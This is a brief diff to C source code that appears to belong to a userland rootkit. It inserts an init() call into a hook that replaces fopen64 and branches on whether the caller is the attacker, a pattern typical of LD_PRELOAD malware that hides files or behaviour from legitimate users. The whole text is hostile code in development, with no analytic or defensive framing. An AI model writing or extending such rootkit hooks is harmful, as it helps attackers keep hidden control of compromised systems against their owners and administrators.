@@ -25,6 +25,7 @@
 #include "hooks.h" /* prototype, FILE */
 
 FILE *fopen64(const char *__restrict path, const char *mode) {
+    init();
     DEBUG(D_INFO, "called fopen(3) hook");
 
     if (is_attacker())
